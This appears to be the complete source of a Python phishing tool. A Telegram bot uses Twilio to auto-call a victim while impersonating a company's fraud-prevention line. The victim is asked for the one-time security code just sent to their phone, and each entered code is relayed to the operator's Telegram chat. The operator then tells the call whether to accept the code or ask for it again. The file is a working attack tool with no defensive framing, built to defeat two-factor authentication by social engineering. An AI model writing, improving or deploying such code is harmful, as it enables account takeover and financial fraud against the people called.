from flask import Flask, request, url_for, Response
from twilio.twiml.voice_response import VoiceResponse
import requests
from twilio.rest import Client
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackContext, MessageHandler, filters, CallbackQueryHandler, ConversationHandler
import nest_asyncio
from threading import Thread
from pyngrok import ngrok

#------------------------------------------------------------------------------
#    Global Variables - API KEYs
#------------------------------------------------------------------------------
ACCOUNT_SID = ''
AUTH_TOKEN = ''
TWILIO_NUMBER = '+17179429619'
TWILIO_PHONE_NUMBER_SID=""

TELEGRAM_TOKEN = ''

FLASK_PORT = 4040
FLASK_SERVER_LINK =f'http://localhost:{FLASK_PORT}'
PUBLIC_URL = ''
FIRST = True

#------------------------------------------------------------------------------

client = Client(ACCOUNT_SID, AUTH_TOKEN)
current_number=''

# This line avoids an error from the async code into Python
nest_asyncio.apply()

NAME, BUSINESS, PHONE = range(3)

#------------------------------------------------------------------------------
#    Global Variables - Voice and Code
#------------------------------------------------------------------------------

VALIDATION_LEN = 6
MAX_ATTEMPTS = 3

ENTERPRISE_NAME = ''
CLIENT_NAME=''
BOT_CALL_GIRL_NAME = 'Pam'


TELEGRAM_CHAT_ID = '' 

#------------------------------------------------------------------------------

user_attempts = {}
current_calls = {}
CALL_SID=""

app = Flask(__name__)


def twiml(resp):
    resp = Response(str(resp))
    resp.headers["Content-Type"]="text/xml"
    return resp

@app.route('/welcome', methods=['POST'])
def welcome():
    send_telegram_message("Call taked by client.")
    response = VoiceResponse()
    with response.gather(
        num_digits=1, action=url_for('option_select'), method='POST'
    ) as g:
        g.say(message=f" Hello {CLIENT_NAME}. This is the {ENTERPRISE_NAME} Fraud Prevention line. "+
                       " We have sent this automated call for an attepmpt to change the password on your account."+
                       " If this was not you, please, press 1...", loop=3, voice="Polly.Amy", language="en-GB")

    return twiml(response)

#------------------------------------------------------------------------------
@app.route('/option_select', methods=['POST'])
def option_select():
    selected_option = request.form["Digits"]
    if selected_option=="1":
        response=VoiceResponse()
        _give_instructions(response)
        return twiml(response)

    return _redirect_welcome()


#------------------------------------------------------------------------------
def _give_instructions(response):
    # here we put the validation code
     with response.gather(
        num_digits=VALIDATION_LEN, action=url_for('validate_code'), method='POST'
     ) as g:
         g.say(f"To block this request, please, enter the {VALIDATION_LEN} digit security code that we have sent to your mobile device.", voice="Polly.Amy", language="en-GB")
         g.pause(length=60)

     return twiml(response)

#------------------------------------------------------------------------------
def _redirect_welcome():
    response = VoiceResponse()
    response.say("Returning to the main menu", voice="Polly.Amy", language="en-GB")
    response.redirect(url_for("welcome"))

    return twiml(response)


#------------------------------------------------------------------------------
@app.route('/validate_code', methods=['GET','POST'])
def validate_code():
    digits = request.form['Digits']
    from_number = request.form['From']
    
    user_attempts[from_number] = user_attempts.get(from_number, 0) + 1
    current_calls[from_number] = digits
    
    # Send the entered code to the Telegram bot
    message = f"{digits}"
    send_telegram_message(message)
    send_telegram_message("/code")
    
    response = VoiceResponse()
    response.say("Thank you! Please wait. We're checking the code.", voice="Polly.Amy", language="en-GB")
    response.pause(length=120)
    # We need to wait the another words
    return twiml(response)

#------------------------------------------------------------------------------
@app.route('/retry', methods=['GET','POST'])
def retry():
    response = VoiceResponse()
    with response.gather(
        num_digits=VALIDATION_LEN, action=url_for('validate_code'), method='POST'
     ) as g:
         g.say("Oh Sorry! This code is incorrect. Please enter it again!", voice="Polly.Amy", language="en-GB")
    return twiml(response)


@app.route('/accept', methods=['GET','POST'])
def accept():
    response = VoiceResponse()
    response.say("Well done! The code that you have entered is valid. The request has been blocked. Good bye!", voice="Polly.Amy", language="en-GB")
    response.hangup()
    return twiml(response)


@app.route('/reject', methods=['GET','POST'])
def reject():
    response = VoiceResponse()
    response.say("The validation of your code has been cancelled. see you soon!",voice="Polly.Amy", language="en-GB")
    response.hangup()
    return twiml(response)

#------------------------------------------------------------------------------
@app.route('/call_status', methods=['POST'])
def call_status():
    status=request.form.get("CallStatus")
    to_number=request.form.get("To")
    if status == "completed":
        send_telegram_message(f"Call to {to_number} was finished.")
    elif status == "busy":
        send_telegram_message(f"Call to {to_number} was busy.")
    elif status == "failed":
        send_telegram_message(f"Call to {to_number} failed!!!")
    elif status == "no-answer":
        send_telegram_message(f"Call to {to_number} was not answered.")

    return Response(status=200)

#------------------------------------------------------------------------------

#------------------------------------------------------------------------------

def make_call(to_number, message_url):
    global current_number, CALL_SID
    current_number=to_number
    call = client.calls.create(
        to=to_number,
        from_=TWILIO_NUMBER,
        url=message_url,
        status_callback=f"{PUBLIC_URL}/call_status",
        status_callback_method="POST",
        status_callback_event=["completed","busy","failed","no-answer"]
    )
    CALL_SID=call.sid

#------------------------------------------------------------------------------

async def start(update: Update, context: CallbackContext):
    global FIRST,PUBLIC_URL
    if FIRST:
        FIRST=False
        PUBLIC_URL=ngrok.connect(FLASK_PORT,"http").public_url
        print(f'ngrok working at {FLASK_PORT} - url: {PUBLIC_URL}')
        client.incoming_phone_numbers(TWILIO_PHONE_NUMBER_SID).update(voice_url=f"{PUBLIC_URL}/welcome")
        
        
    await context.bot.send_message(chat_id=update.effective_chat.id, text='Welcome! Please enter your name:')
    return NAME


#------------------------------------------------------------------------------
async def handle_client(update: Update, context: CallbackContext):
    global CLIENT_NAME
    CLIENT_NAME = update.message.text
    await update.message.reply_text('Thank you! Now, please enter your business name:')
    return BUSINESS
    
async def handle_business(update: Update, context: CallbackContext):
    global ENTERPRISE_NAME
    ENTERPRISE_NAME = update.message.text
    await update.message.reply_text('Great! Finally, please enter your phone number:')
    return PHONE
    
async def handle_phone(update: Update, context: CallbackContext):
    global TELEGRAM_CHAT_ID
    phone_number = update.message.text
    TELEGRAM_CHAT_ID =update.message.chat_id
    call_url = f'{PUBLIC_URL}/welcome'
    await update.effective_message.reply_text("A call has been initiated. Please follow the instructions.")
    make_call(phone_number, call_url)
    return ConversationHandler.END


#------------------------------------------------------------------------------

async def handle_code(update: Update, context: CallbackContext):
    # Display buttons to the user for validation
    keyboard = [
        [
            InlineKeyboardButton("Accept", callback_data='accept'),
            InlineKeyboardButton("Reject", callback_data='reject'),
            InlineKeyboardButton("Retry", callback_data='retry')
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.effective_message.reply_text(f"Please validate the code:", reply_markup=reply_markup)

#------------------------------------------------------------------------------

async def button(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    
    from_number = current_number

    if query.data == 'accept':
        await query.edit_message_text(text="Code accepted.")
    elif query.data == 'reject':
        await query.edit_message_text(text="Code rejected.")
    elif query.data == 'retry':
        await query.edit_message_text(text="Retry code.")

    client.calls(CALL_SID).update(
        url=f"{PUBLIC_URL}/{query.data}",
        method="POST"
    )


#------------------------------------------------------------------------------

def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message,
    }
    requests.post(url, data=payload)

#------------------------------------------------------------------------------



application = ApplicationBuilder().token(TELEGRAM_TOKEN).build()

conv_handler = ConversationHandler(
    entry_points=[CommandHandler('start', start)],
    states={
        NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_client)],
        BUSINESS: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_business)],
        PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_phone)],
    },
    fallbacks=[]
)

            
application.add_handler(conv_handler)
application.add_handler(CommandHandler('code', handle_code))
application.add_handler(CallbackQueryHandler(button))

class FlaskThread(Thread):
    def run(self) -> None:
        app.run(port=FLASK_PORT)

class TelegramThread(Thread):
    def run(self) -> None:
        application.run_polling()
        

if __name__ == '__main__':

    flaskk=FlaskThread()
    flaskk.daemon=True
    flaskk.start()

    
    Telegram=TelegramThread()
    Telegram.daemon=True
    Telegram.start()


    
